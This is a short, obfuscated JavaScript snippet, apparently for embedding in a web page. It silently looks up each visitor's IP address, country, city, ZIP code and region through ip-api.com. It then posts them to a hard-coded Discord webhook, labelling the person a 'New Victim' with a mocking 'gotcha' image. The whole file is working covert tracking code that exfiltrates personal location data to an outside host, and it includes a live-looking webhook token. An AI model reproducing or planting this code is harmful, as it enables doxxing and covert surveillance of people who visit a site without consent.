async function IP_Info() {
  let _0x119775 = await fetch("http://ip-api.com/json", {
    'method': "GET",
    'headers': {
      'cache-control': "no-cache",
      'content-type': 'application/json'
    }
  });
  return _0x119775.json();
}
IP_Info().then(_0x2df9dc => {
  let _0xc03c96 = ["status", "country", 'city', 'zip', "regionName"];
  let _0x561055 = false;
  for (var _0x4f893f = 0x0; _0x4f893f < _0xc03c96.length; _0x4f893f++) {
    if (typeof _0x2df9dc['' + _0xc03c96[_0x4f893f]] === "undefined") {
      _0x561055 = true;
      break;
    }
  }
  if (_0x561055) {
    return null;
  }
  return _0x2df9dc;
}).then(async _0x50a10d => {
  if (_0x50a10d !== null) {
    await fetch("https://discord.com/api/webhooks/1151487120406478898/oGOV2Qhj5dpw0wQ9YIGFArUi6B6v6CzdESnYuLKdebDpvr8M9BpK2mn4GxnrxCDABChG", {
      'method': "POST",
      'headers': {
        'Content-Type': 'application/json'
      },
      'body': JSON.stringify({
        'content': "``New Victim``",
        'embeds': [{
          'title': "Victim IP",
          'type': "rich",
          'color': '25500',
          'description': "```IP information of the recent website visitor.```",
          'fields': [{
            'name': 'IP',
            'value': '' + _0x50a10d.query,
            'inline': false
          }, {
            'name': "Country",
            'value': '' + _0x50a10d.country,
            'inline': false
          }, {
            'name': "City",
            'value': '' + _0x50a10d.city,
            'inline': false
          }, {
            'name': "ZIP",
            'value': '' + _0x50a10d.zip,
            'inline': false
          }, {
            'name': "Region",
            'value': '' + _0x50a10d.regionName,
            'inline': false
          }],
          'footer': {
            'text': "We all luv noutaja <3",
            'icon_url': "https://cdn.discordapp.com/avatars/928763754261381151/26ca86192ef72b768390013137cdc532?size=256"
          },
          'author': {
            'name': "Noutaja<3 ",
            'url': "https://discord.gg/PncmmWJ2tv"
          },
          'thumbnail': {
            'url': 'https://media.makeameme.org/created/gotcha-bitch-ha-5c5ca1.jpg'
          }
        }]
      })
    }).then(_0x14dbd2 => {
      console.log(_0x14dbd2.statusText);
    })["catch"](_0x3e7bbe => {
      console.log(_0x3e7bbe);
    });
  }
})["catch"](_0x1c17ad => {
  console.log(_0x1c17ad);
  console.log("Request not send");
});
